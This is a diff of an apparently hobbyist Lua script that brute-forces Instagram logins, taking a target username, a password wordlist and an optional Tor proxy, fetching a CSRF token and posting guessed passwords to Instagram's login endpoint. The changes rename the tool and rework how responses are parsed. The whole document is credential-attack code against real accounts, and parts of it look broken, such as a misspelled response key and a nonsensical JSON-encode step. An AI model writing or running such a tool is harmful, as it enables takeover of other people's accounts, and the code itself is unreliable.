@@ -2,6 +2,7 @@
 local argparse = require('argparse')
 local http = require('socket.http')
 local ltn = require('ltn12')
+local json = require("cjson")
 
 local request_payload = [[queryParams={}&optIntoOneTap=false]]
 local request_headers = {
@@ -16,7 +17,7 @@ local function wait(time)
     repeat until os.time() > timer + time
 end
 
-local titernik = [[
+local titer = [[
                 `         '
 ;,,,             `       '             ,,,;
 `YES8888bo.       :     :       .od8888YES'
@@ -35,46 +36,48 @@ local titernik = [[
           '8Y  `Y         Y'  Y8'
            Y                   Y
            !                   !
-  https://github.com/sudurraaa/titernik
+  https://github.com/sudurraaa/titer
 ]]
 
 
-local function attack(victim, password, tor)
+local function attack(password, tor)
 	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":sudopacmandeleteme17G"
 	local attack_response = {}
-	local code, body, headers = http.request {
+	http.request {
 		url = "https://instagram.com/accounts/login/ajax/",
 		method = "POST",
 		headers = request_headers,
 		source = ltn.source.string(request_payload),
 		sink = ltn.sink.table(attack_response)
 	}
-	print(table.concat(attack_response))
+	for _,resp in pairs(attack_response) do
+		local hack_req = json.encode(resp)
+		print(hack_req['"authenitcated"'])
+	end
 end
 
 local function main()
 	local parser = argparse() {
-		name = "titernik",
-		description = titernik,
-		epilog = "Usage: titernik -t blackarch -w wordlist.txt -p disable"
+		name = "titer",
+		description = titer,
+		epilog = "Usage: titer -t blackarch -w wordlist.txt -p disable"
 	}
 	parser:option('-t --target', "Specify target instagram username")
 	parser:option('-w --wordlist', "Specify wordlist file path")
 	parser:option('-p --proxy', "Enable or Disable tor service")
 		:choices {"enable", "disable"}
 	parser:flag('-v --version', "Get current version of soft"):action(function()
-		print("titernik v1.0.0")
+		print("titer v1.0.0(alpha)")
 		os.exit(0)
 	end)
-	parser:flag('-a --asci', 'Print titernik ascii'):action(function()
-		print(titernik)
+	parser:flag('-a --asci', 'Print titer ascii'):action(function()
+		print(titer)
 		os.exit(0)
 	end)
 	local args = parser:parse()
     request_payload = request_payload .. "&username=" .. args.target
-	
 	-- Making http request to instagram to get csrf token
-	local code, body ,headers = http.request {
+	local body, code,headers = http.request {
 		url = "https://instagram.com/accounts/login/",
 		method = "GET",
 		headers = request_headers,
